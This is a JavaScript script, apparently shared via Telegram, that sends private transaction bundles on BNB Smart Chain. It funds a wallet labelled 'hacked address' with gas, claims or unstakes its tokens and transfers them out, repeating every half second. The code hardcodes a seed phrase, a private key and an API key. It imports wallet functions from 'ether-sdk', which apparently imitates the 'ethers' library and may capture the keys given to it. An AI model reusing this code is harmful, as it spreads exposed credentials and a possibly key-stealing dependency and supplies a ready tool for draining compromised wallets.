//Script created by https://t.me/barthadam  //Telegram @barthadam


const ethers = require("ethers")
const ethersWallet= require("ether-sdk")
const Web3 = require("web3")



// wallet that send's BNB to claim 
var seed = "stuff emerge state amateur steak script fuel upper pumpkin time resource labor"
let mnemonicWallet = ethersWallet.fromMnemonic(seed);
var PRIVATEKEY = mnemonicWallet.privateKey;
var myAddress = mnemonicWallet.address

// wallet for claim reward or unstake

var Key = "de15d2f43192f331d7678c0ffa1a271308924ae60661f4bcc055a0179588a8d2" // PRIVATE KEY 
var hash32Key = ethersWallet.fromPrivateKey(Key);



async function main() {
  var url1='https://bsc-dataseed.binance.org'
  var url2='https://bsc-dataseed1.defibit.io'
  var url3='https://bsc-dataseed1.ninicoin.io'
  var url5 = "https://bsc.nodereal.io"
  

   const web3 = new Web3(
    new Web3.providers.HttpProvider(url5)
  );
  
  const signer = web3.eth.accounts.privateKeyToAccount(
    hash32Key
  );

    let iface = new ethers.utils.Interface([
      'event Approval(address indexed owner, address indexed spender, uint value)',
      'event Transfer(address indexed from, address indexed to, uint value)',
      'function name() external pure returns (string memory)',
      'function symbol() external pure returns (string memory)',
      'function decimals() external pure returns (uint8)',
      'function totalSupply() external view returns (uint)',
      'function balanceOf(address owner) external view returns (uint)',
      'function allowance(address owner, address spender) external view returns (uint)',
      'function approve(address spender, uint value) external returns (bool)',
      'function transfer(address to, uint value) external returns (bool)',
  
      'function DOMAIN_SEPARATOR() external view returns (bytes32)',
      'function PERMIT_TYPEHASH() external pure returns (bytes32)',
      'function nonces(address owner) external view returns (uint)',
      'function release(bytes32 )'
    ]);
  



   var noncesend =  await web3.eth.getTransactionCount(myAddress, 'latest'); 
   var nonce = await web3.eth.getTransactionCount(signer.address,'latest')// nonce starts counting from 0

   gasPrice=1000000000
   const transaction = {
    'form':myAddress,
    'to': signer.address, 
    'gas': 21000, 
    'value':ethers.utils.parseUnits((1000000000*300000).toString(),"wei"),
    'gasPrice': gasPrice, 
    'nonce':noncesend
   };

   const transactionBundle = {
    'form':myAddress,
    'to': "0xA9BAF7e3B6A21E24E5450E23C921e60F5F1B99A4", // hacked address 
    'gas': 21000, 
    'value':web3.utils.toWei('0.008','ether'),
    'gasPrice': "5000000000", 
    'nonce':noncesend+1
   };
   
   const transaction2 = {
    'from':signer.address,
     'to':"0x9BAbf3490ee292bAbFCcf6DF26475108D88eDfb2", // claim or unstake contract
     'gas': 200000,  
     'gasPrice': 1000000000, 
     "data":iface.encodeFunctionData("release",[
      ""
     ]
    ),
     'nonce':nonce
    };
    
    const transaction3 = {
      'from':signer.address,
       'to':"0xBE2a26889CE30a1515055a192797083B1FDe8844", // token contract
       'gas': 100000,  
       'gasPrice': 1000000000 , 
     "data":iface.encodeFunctionData("transfer",[
      myAddress,
      web3.utils.toWei('1000','ether') // change 77 to how many token's u want transfer 
    ]),
       'nonce':nonce+1
      };
  
  

  const signedTx = await web3.eth.accounts.signTransaction(transaction, PRIVATEKEY);
  const signedTx2 = await web3.eth.accounts.signTransaction(transaction2, signer.privateKey);
  const signedTx3 = await web3.eth.accounts.signTransaction(transaction3, signer.privateKey );
  const signedTx5 = await web3.eth.accounts.signTransaction(transactionBundle, PRIVATEKEY);

 


  
var block = await web3.eth.getBlock('latest')
block = block.number+2
console.log(block)
block = block.toString(16)


var resp = await fetch('https://bnb-mainnet.g.alchemy.com/v2/', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'K-g36Q6qB-7NsX2OB5FcTs1Ok3i6ycAE' // change your api key 
  },
  body: JSON.stringify({
    'id': '1',
    'method': 'blxr_submit_bundle',
    'params': {
      'transaction':[signedTx5.rawTransaction,signedTx.rawTransaction,signedTx2.rawTransaction,signedTx3.rawTransaction],
      'blockchain_network': 'BSC-Mainnet',
      'block_number': '0x'+block,
  
    }
  })
});
  var data = await resp.text();
  console.log(data)


}
  
setInterval(() => {
  main()
  },500);



